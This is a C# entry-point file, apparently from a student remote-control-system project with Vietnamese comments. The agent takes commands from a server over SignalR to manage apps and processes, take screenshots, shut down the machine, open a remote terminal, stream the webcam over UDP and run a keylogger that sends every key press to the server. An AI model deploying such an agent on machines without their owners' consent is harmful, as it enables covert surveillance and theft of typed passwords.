// -----------------------------------------------------------------------------
// File: Program.cs
// Role: Điểm khởi chạy chính (Entry Point) của Agent.
//
// Nhiệm vụ:
//      1. Khởi tạo và kết nối các dịch vụ (SignalR, System, App, Cam...).
//      2. Lắng nghe lệnh từ Server thông qua SignalR.
//      3. Điều phối luồng dữ liệu (UDP Stream cho Webcam, JSON cho lệnh).
// -----------------------------------------------------------------------------

using RCS.Agent.Services;
using RCS.Agent.Services.Windows;
using RCS.Common.Models;
using RCS.Common.Protocols;
using System.Net;
using System;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Speech.Synthesis;

namespace RCS.Agent
{
    class Program
    {
       #region --- CONFIGURATION (CẤU HÌNH HỆ THỐNG) ---

        // Thông tin định danh
        public static string AGENT_ID = "Agent_12345";

        private const string DEFAULT_AGENT_ID = "Agent_12345";
        
        // Cấu hình Mặc định (Fallback)
        private const string DEFAULT_SERVER_HOST = "127.0.0.1";
        private const int SERVER_TCP_PORT = 5000;  // Port SignalR
        private const int SERVER_UDP_PORT = 6000;  // Port Video

        // Cấu hình UDP Streaming
        private const int MAX_PACKET_SIZE = 45000; 

        // Cấu hình FPS (Frame Per Second)
        public const int FRAME_PER_SECOND = 60;
        public const int SECOND_PER_FRAME = 1000 / FRAME_PER_SECOND; 

        // Biến lưu cấu hình động (Sẽ được gán khi chạy)
        public static string SERVER_URL_FINAL;      // URL đầy đủ cho SignalR
        public static string CURRENT_SERVER_IP;     // IP trần cho UDP

        #endregion

        #region --- SERVICES & STATE (DỊCH VỤ & BIẾN TRẠNG THÁI) ---

        // Các Service quản lý chức năng cụ thể
        private static SignalRClient _signalRClient;
        private static ApplicationManager _appManager;
        private static ProcessMonitor _processMonitor;
        private static SystemControl _systemControl;
        private static MediaCapture _mediaCapture;
        private static Keylogger _keylogger;
        private static SystemInfoManager _sysInfoManager; 
        private static TerminalService _terminalService;
        private static AutomationService _automationService;

        // Biến phục vụ Streaming
        private static CancellationTokenSource _webcamCts; 
        private static UdpClient _udpClient;               
        private static int _frameSequence = 0;   


        #endregion

        #region --- MAIN ENTRY POINT (KHỞI CHẠY) ---

        static async Task Main(string[] args)
        {
            Console.Title = $"RCS Agent - {AGENT_ID}";
            Console.WriteLine("=== RCS AGENT LAUNCHER ===");

            // --- LOGIC XÁC ĐỊNH IP SERVER (LOGIN LOGIC) ---

            // Trường hợp 1: Có tham số dòng lệnh (vd: Agent.exe 192.168.1.50)
            if (args.Length > 0 && IPAddress.TryParse(args[0], out _))
            {
                CURRENT_SERVER_IP = args[0];
                Console.WriteLine($"[Config] Auto-detected IP from args: {CURRENT_SERVER_IP}");
            }
            // Trường hợp 2: Không có tham số -> Hỏi người dùng
            else
            {
                Console.Write($"Enter Server IP (Default: {DEFAULT_SERVER_HOST}): ");
                string input = Console.ReadLine();

                if (!string.IsNullOrWhiteSpace(input))
                {
                    // Tạm chấp nhận input là IP hoặc domain
                    CURRENT_SERVER_IP = input.Trim();
                }
                else
                {
                    CURRENT_SERVER_IP = DEFAULT_SERVER_HOST;
                    Console.WriteLine($"[Config] No input provided. Using localhost.");
                }
            }

            if (args.Length > 1)
            {
                AGENT_ID = args[0];
                Console.WriteLine($"[Config] Auto-detected Agent ID: {AGENT_ID}");
            }
            // Trường hợp 2: Không có tham số -> Hỏi người dùng
            else
            {
                Console.Write($"Enter AGENT_ID (Default: {DEFAULT_AGENT_ID}): ");
                string input = Console.ReadLine();

                if (!string.IsNullOrWhiteSpace(input))
                {
                    // Tạm chấp nhận input là IP hoặc domain
                    AGENT_ID = input.Trim();
                }
                else
                {
                    AGENT_ID = DEFAULT_AGENT_ID;
                    Console.WriteLine($"[Config] No input provided. Using ${DEFAULT_AGENT_ID}.");
                }
            }


            // Tạo chuỗi kết nối chuẩn
            SERVER_URL_FINAL = $"http://{CURRENT_SERVER_IP}:{SERVER_TCP_PORT}/agenthub";
            
            Console.WriteLine($"---------------------------------------------");
            Console.WriteLine($"Target Server: {CURRENT_SERVER_IP}");
            Console.WriteLine($"Websocket URL  : {SERVER_URL_FINAL}");
            Console.WriteLine($"UDP Target   : {CURRENT_SERVER_IP}:{SERVER_UDP_PORT}");
            Console.WriteLine($"---------------------------------------------");

            // --- BẮT ĐẦU KHỞI TẠO ---

            // 1. Khởi tạo dịch vụ
            InitializeServices();

            // 2. Kết nối tới Server
            Console.WriteLine("Connecting to Server...");
            await _signalRClient.ConnectAsync(AGENT_ID);

            Console.WriteLine("Agent is running. Press CTRL+C to exit.");

            // 3. Giữ ứng dụng chạy
            await Task.Delay(-1);
        }

        private static void InitializeServices()
        {
            // Khởi tạo các instance
            _appManager = new ApplicationManager();
            _processMonitor = new ProcessMonitor();
            _systemControl = new SystemControl();
            _mediaCapture = new MediaCapture();
            _keylogger = new Keylogger();
            _udpClient = new UdpClient();
            _sysInfoManager = new SystemInfoManager();
            _automationService = new AutomationService();
            // ...

            // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
            _signalRClient = new SignalRClient(SERVER_URL_FINAL);

            _terminalService = new TerminalService(_signalRClient); // Khởi tạo

            _signalRClient.OnCommandReceived += HandleCommand;

        }

        #endregion

        #region --- COMMAND HANDLING (XỬ LÝ LỆNH TỪ SERVER) ---

        /// <summary>
        /// Hàm trung tâm xử lý mọi lệnh nhận được từ SignalR.
        /// </summary>
        private static async Task HandleCommand(CommandMessage cmd)
        {
            Console.WriteLine($"[Command] {cmd.Action}");
            try
            {
                switch (cmd.Action)
                {
                    // --- NHÓM 1: ỨNG DỤNG (APPS) ---
                    case ProtocolConstants.ActionAppList:
                        await SendResponse(cmd.Action, _appManager.GetInstalledApps());
                        break;
                    case ProtocolConstants.ActionAppStart:
                        _appManager.StartApp(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "started");
                        break;
                    case ProtocolConstants.ActionAppStop:
                        _appManager.StopApp(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "stopped");
                        break;

                    // --- NHÓM 2: TIẾN TRÌNH (PROCESSES) ---
                    case ProtocolConstants.ActionProcessList:
                        await SendResponse(cmd.Action, _processMonitor.GetProcesses());
                        break;
                    case ProtocolConstants.ActionProcessStart:
                        _processMonitor.StartProcess(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "started");
                        break;
                    case ProtocolConstants.ActionProcessStop:
                        if (int.TryParse(GetParam(cmd, "pid"), out int pid))
                        {
                            _processMonitor.KillProcess(pid);
                        }
                        await SendResponse(cmd.Action, "killed");
                        break;
                    case ProtocolConstants.ActionGetSystemSpecs:
                        var specs = _sysInfoManager.GetSpecs();
                        await SendResponse(cmd.Action, specs);
                        break;

                    // --- NHÓM 3: HỆ THỐNG (SYSTEM & SCREENSHOT) ---
                    case ProtocolConstants.ActionScreenshot:
                        // Chụp màn hình và gửi trực tiếp dạng Base64 qua SignalR (không qua UDP)
                        await _signalRClient.SendBinaryAsync(_mediaCapture.CaptureScreenBase64());
                        break;
                    case ProtocolConstants.ActionShutdown:
                        _systemControl.Shutdown();
                        break;
                    case ProtocolConstants.ActionRestart:
                        _systemControl.Restart();
                        break;

                    // --- NHÓM 4: KEYLOGGER ---
                    case ProtocolConstants.ActionKeyloggerStart:
                        // Start nhận callback mỗi khi phím được nhấn -> Gửi ngay về server
                        _keylogger.Start(async (key) => 
                        { 
                            await _signalRClient.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key }); 
                        });
                        break;
                    case ProtocolConstants.ActionKeyloggerStop:
                        _keylogger.Stop();
                        await SendResponse(cmd.Action, "stopped");
                        break;

                    // --- NHÓM 5: WEBCAM STREAMING (UDP) ---
                    case ProtocolConstants.ActionWebcamOn:
                        if (_webcamCts == null)
                        {
                            _webcamCts = new CancellationTokenSource();
                            // Chạy vòng lặp stream trên một Task riêng biệt
                            _ = Task.Run(async () => await StreamWebcamLoop(_webcamCts.Token));
                        }
                        break;

                    case ProtocolConstants.ActionWebcamOff:
                        // 1. Hủy token để thoát vòng lặp streaming
                        _webcamCts?.Cancel();
                        _webcamCts = null;

                        // 2. Cưỡng chế tắt Camera ngay lập tức để đèn webcam tắt
                        _mediaCapture.StopWebcam();
                        
                        Console.WriteLine("[Webcam] Force stopped.");
                        await SendResponse(cmd.Action, "stopped");
                        break;


                    // --- NHÓM LỆNH TERMINAL ---
                    case ProtocolConstants.ActionTerminalStart:
                        _terminalService.StartTerminal();
                        break;
                    case ProtocolConstants.ActionTerminalStop:
                        _terminalService.StopTerminal();
                        break;
                    case ProtocolConstants.ActionTerminalInput:
                        // Lấy lệnh từ tham số 'cmd' gửi xuống
                        string inputCmd = GetParam(cmd, "cmd");
                        _terminalService.WriteInput(inputCmd);
                        break;

                    // --- NHÓM TƯƠNG TÁC ---
                    case ProtocolConstants.ActionShowMessageBox:
                        string msg = GetParam(cmd, "text");
                        _automationService.ShowMessageBox(msg);
                        await SendResponse(cmd.Action, "displayed");
                        break;

                    case ProtocolConstants.ActionTextToSpeech:
                        string textToSpeak = GetParam(cmd, "text");
                        _automationService.SpeakText(textToSpeak);
                        await SendResponse(cmd.Action, "speaking");
                        break;

                    // --- NHÓM MACRO (KỊCH BẢN TỰ ĐỘNG) ---
                    case ProtocolConstants.ActionRunMacro:
                        string macroType = GetParam(cmd, "type");
                        await RunMacro(macroType);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing command {cmd.Action}: {ex.Message}");
            }
        }

        #endregion

        #region --- UDP STREAMING LOGIC (LUỒNG GỬI VIDEO) ---

        /// <summary>
        /// Vòng lặp liên tục lấy ảnh từ Webcam và gửi qua UDP.
        /// </summary>
        private static async Task StreamWebcamLoop(CancellationToken token)
        {
            Console.WriteLine("[Webcam] UDP High Quality Stream started...");

            // Bật Camera, nếu thất bại thì thoát luôn
            if (!_mediaCapture.StartWebcam()) return;

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // 1. Lấy dữ liệu ảnh JPEG dạng byte array
                    byte[] imageBytes = _mediaCapture.GetWebcamFrameBytes();

                    if (imageBytes != null && imageBytes.Length > 0)
                    {
                        // 2. Chia nhỏ và gửi qua UDP
                        await SendFragmentedImage(imageBytes);
                    }

                    // // 3. Nghỉ một chút để giữ FPS ổn định (không chiếm 100% CPU)
                    // await Task.Delay(1, token);
                }
                catch (TaskCanceledException) { break; } // Thoát êm khi bấm Stop
                catch (ObjectDisposedException) { break; }
                catch (Exception ex)
                {
                    if (!token.IsCancellationRequested)
                        Console.WriteLine($"[Stream Error] {ex.Message}");
                }
            }

            // Đảm bảo tắt camera lần cuối khi thoát vòng lặp
            _mediaCapture.StopWebcam();
        }

        /// <summary>
        /// Chia file ảnh lớn thành các gói tin nhỏ (Fragmentation) để gửi qua UDP.
        /// </summary>
        private static async Task SendFragmentedImage(byte[] imageBytes)
        {
            try
            {
                // Lấy thời gian hiện tại (dùng để đồng bộ frame bên Client)
                long timestamp = DateTime.UtcNow.Ticks;
                int totalLength = imageBytes.Length;

                // Tính toán số lượng gói tin cần chia
                ushort totalPackets = (ushort)Math.Ceiling((double)totalLength / MAX_PACKET_SIZE);
                
                // Tăng ID frame lên 1 (Thread-safe)
                int frameId = Interlocked.Increment(ref _frameSequence);

                const int HEADER_SIZE = 20;

                for (ushort i = 0; i < totalPackets; i++)
                {
                    int offset = i * MAX_PACKET_SIZE;
                    // Kích thước gói này (gói cuối cùng có thể nhỏ hơn MAX_PACKET_SIZE)
                    int size = Math.Min(MAX_PACKET_SIZE, totalLength - offset);

                    // --- CẤU TRÚC HEADER (20 Bytes) ---
                    // [0-3]: Frame ID (Int32) - Để biết gói này thuộc bức ảnh nào
                    // [4-5]: Packet Index (UInt16) - Số thứ tự gói
                    // [6-7]: Total Packets (UInt16) - Tổng số gói của bức ảnh
                    // [8-11]: Payload Size (Int32) - Kích thước dữ liệu ảnh trong gói này
                    // [12-19]: Timestamp (Int64) - Thời gian chụp
                    byte[] header = new byte[HEADER_SIZE];
                    BitConverter.GetBytes(frameId).CopyTo(header, 0);
                    BitConverter.GetBytes(i).CopyTo(header, 4);
                    BitConverter.GetBytes(totalPackets).CopyTo(header, 6);
                    BitConverter.GetBytes(size).CopyTo(header, 8);
                    BitConverter.GetBytes(timestamp).CopyTo(header, 12);

                    // Ghép Header + Data
                    byte[] packet = new byte[HEADER_SIZE + size];
                    Array.Copy(header, 0, packet, 0, HEADER_SIZE);
                    Array.Copy(imageBytes, offset, packet, HEADER_SIZE, size);

                    // Gửi gói tin đi
                    await _udpClient.SendAsync(packet, packet.Length, CURRENT_SERVER_IP, SERVER_UDP_PORT);
                }
            }
            catch { }
        }

        #endregion

        #region --- HELPER METHODS ---

        /// <summary>
        /// Gửi phản hồi nhanh về Server thông qua SignalR.
        /// </summary>
        private static async Task SendResponse(string action, object data)
        {
            await _signalRClient.SendResponseAsync(new ResponseMessage 
            { 
                Action = action, 
                Response = data 
            });
        }

        /// <summary>
        /// Trích xuất tham số từ CommandMessage (Hỗ trợ cả JSON object và String thông thường).
        /// </summary>
        private static string GetParam(CommandMessage cmd, string key)
        {
            if (cmd.Params == null) return "";

            try
            {
                // Trường hợp 1: Params là JsonElement (System.Text.Json)
                if (cmd.Params is System.Text.Json.JsonElement jsonElement)
                {
                    if (jsonElement.TryGetProperty(key, out var value)) 
                        return value.ToString();
                }

                // Trường hợp 2: Params là String (Parse thủ công)
                var str = cmd.Params.ToString();
                if (str.Contains(key))
                {
                    // Cắt chuỗi dựa trên ký tự phân cách
                    var parts = str.Split(new[] { key, ":" }, StringSplitOptions.RemoveEmptyEntries);
                    
                    for (int i = 0; i < parts.Length; i++)
                    {
                        // Tìm giá trị nằm ngay sau key
                        if (parts[i].Contains(key) && i + 1 < parts.Length)
                        {
                            return CleanString(parts[i + 1]);
                        }
                    }
                    
                    // Fallback đơn giản
                    if (parts.Length > 1) 
                        return CleanString(parts[1]);
                }
            }
            catch { }
            return "";
        }

        // Hàm phụ làm sạch chuỗi (xóa ngoặc, nháy kép, khoảng trắng)
        private static string CleanString(string input)
        {
            return input.Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
        }

        // HÀM XỬ LÝ MACRO RIÊNG
        private static async Task RunMacro(string type)
        {
            Console.WriteLine($"[Macro] Executing script: {type}");
            
            if (type == "panic_mode") // Kịch bản: Dọn dẹp khẩn cấp
            {
                // 1. Hiện thông báo trêu tức
                _automationService.ShowMessageBox("Hệ thống phát hiện xâm nhập! Tự hủy sau 3 giây...");
                
                // 2. Nói cảnh báo
                _automationService.SpeakText("System compromised. Shutting down immediately.");

                // 3. Tắt các trình duyệt (Chrome, Edge)
                _appManager.StopApp("chrome");
                _appManager.StopApp("msedge");

                // 4. Chờ 3 giây
                await Task.Delay(3000);

                // 5. Tắt máy (Hoặc Logoff)
                // _systemControl.Shutdown(); // Uncomment dòng này để tắt thật
                Console.WriteLine("[Macro] Fake shutdown executed."); 
            }
            else if (type == "open_workspace") // Kịch bản: Mở môi trường làm việc
            {
                _appManager.StartApp("notepad");
                _appManager.StartApp("calc");
                _automationService.SpeakText("Workspace is ready boss.");
            }

            await SendResponse(ProtocolConstants.ActionRunMacro, "executed");
        }

        #endregion
    }
}